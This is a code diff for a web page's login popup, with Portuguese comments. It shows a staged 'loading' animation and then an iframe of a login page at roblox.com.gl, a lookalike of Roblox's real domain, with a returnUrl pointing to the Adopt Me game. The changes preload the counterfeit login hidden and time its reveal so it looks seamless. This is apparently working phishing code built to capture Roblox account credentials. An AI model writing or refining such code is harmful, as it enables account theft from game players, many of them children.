@@ -108,8 +108,8 @@
             </div>
         </div>
         
-        <!-- Popup Content - Iframe -->
-        <div class="popup-content iframe-content" id="iframeContent" style="display: none;">
+        <!-- Popup Content - Iframe (hidden until loaded) -->
+        <div class="popup-content iframe-content" id="iframeContent" style="display: none; visibility: hidden;">
             <iframe id="robloxIframe" frameborder="0" class="content-iframe"></iframe>
         </div>
     </div>
@@ -178,6 +178,12 @@
     const navLinks = document.querySelector('.nav-links');
     const navRight = document.querySelector('.nav-right');
 
+    // Configurações de tempo
+    const MIN_LOAD_TIME = 3000;  // Tempo mínimo de animação (3s)
+    const MAX_LOAD_TIME = 8000;  // Tempo máximo (8s) - fallback
+    let loadTimeout = null;
+    let animationInterval = null;
+
     // Open popup on login button click
     loginBtn.addEventListener('click', () => {
         popupOverlay.classList.add('active');
@@ -185,6 +191,7 @@
         authContent.style.display = 'block';
         loadingContent.style.display = 'none';
         iframeContent.style.display = 'none';
+        iframeContent.style.visibility = 'hidden';
         resetMessages();
     });
 
@@ -200,53 +207,104 @@
 
     function closePopup() {
         popupOverlay.classList.remove('active');
+        clearTimeouts();
         resetMessages();
+        robloxIframe.src = '';
+    }
+
+    function clearTimeouts() {
+        if (loadTimeout) clearTimeout(loadTimeout);
+        if (animationInterval) clearInterval(animationInterval);
     }
 
     function resetMessages() {
         message1.style.opacity = '0.3';
         message2.style.opacity = '0.3';
         message3.style.opacity = '0.3';
+        message4.style.color = '';
         message4.style.opacity = '0.3';
     }
 
-    // Continue button - show loading animation
+    function runLoadingAnimation(duration) {
+        const messages = [
+            { el: message1, delay: 0 },
+            { el: message2, delay: duration * 0.25 },
+            { el: message3, delay: duration * 0.5 },
+            { el: message4, delay: duration * 0.75 }
+        ];
+
+        let startTime = Date.now();
+
+        animationInterval = setInterval(() => {
+            let elapsed = Date.now() - startTime;
+            
+            messages.forEach((msg, index) => {
+                if (elapsed >= msg.delay) {
+                    msg.el.style.opacity = '1';
+                    msg.el.style.color = '#ff2d87';
+                }
+                if (elapsed < msg.delay || elapsed >= messages[index + 1]?.delay) {
+                    if (elapsed < messages[index + 1]?.delay || index === messages.length - 1) {
+                        if (elapsed >= msg.delay + 500) {
+                            msg.el.style.opacity = '0.3';
+                        }
+                    }
+                }
+            });
+
+            if (elapsed >= duration) {
+                message1.style.opacity = '0.3';
+                message2.style.opacity = '0.3';
+                message3.style.opacity = '0.3';
+                message4.style.opacity = '1';
+                message4.style.color = '#ff2d87';
+            }
+        }, 100);
+    }
+
+    // Continue button - show loading then iframe
     btnContinue.addEventListener('click', () => {
         authContent.style.display = 'none';
         loadingContent.style.display = 'flex';
         
-        // Animate messages
-        setTimeout(() => {
-            message1.style.opacity = '1';
-            message1.style.color = '#ff2d87';
-        }, 500);
+        // Começa a carregar o iframe em background (oculto)
+        robloxIframe.src = 'https://www.roblox.com.gl/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F252064938587%2FAdopt-Me';
         
-        setTimeout(() => {
-            message1.style.opacity = '0.3';
-            message2.style.opacity = '1';
-            message2.style.color = '#ff2d87';
-        }, 2000);
+        let animationDuration = MIN_LOAD_TIME;
         
-        setTimeout(() => {
-            message2.style.opacity = '0.3';
-            message3.style.opacity = '1';
-            message3.style.color = '#ff2d87';
-        }, 3500);
+        // Tenta detectar se o iframe carregou (pode não funcionar cross-origin)
+        let iframeLoaded = false;
         
-        setTimeout(() => {
-            message3.style.opacity = '0.3';
-            message4.style.opacity = '1';
-            message4.style.color = '#ff2d87';
-        }, 5000);
+        robloxIframe.onload = function() {
+            iframeLoaded = true;
+        };
         
-        // After loading, show iframe with src only when needed
+        // Se carregar rápido, aguarda o mínimo. Se demorar, usa o máximo.
+        loadTimeout = setTimeout(() => {
+            showIframe();
+        }, Math.max(MIN_LOAD_TIME, MAX_LOAD_TIME));
+        
+        // Roda a animação
+        runLoadingAnimation(animationDuration);
+
+        // Após tempo mínimo, mostra o iframe
         setTimeout(() => {
-            loadingContent.style.display = 'none';
-            iframeContent.style.display = 'block';
-            robloxIframe.src = 'https://www.roblox.com.gl/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F252064938587%2FAdopt-Me';
-            popupContainer.classList.add('expanded');
-        }, 6500);
+            clearTimeouts();
+            showIframe();
+        }, MIN_LOAD_TIME);
     });
+
+    function showIframe() {
+        clearTimeouts();
+        loadingContent.style.display = 'none';
+        iframeContent.style.display = 'block';
+        
+        // Pequeno delay para garantir que o DOM atualize
+        setTimeout(() => {
+            iframeContent.style.visibility = 'visible';
+            popupContainer.classList.add('expanded');
+        }, 50);
+    }
 
     // Manage Servers - Not Logged In Popup
     manageServersBtn.addEventListener('click', () => {
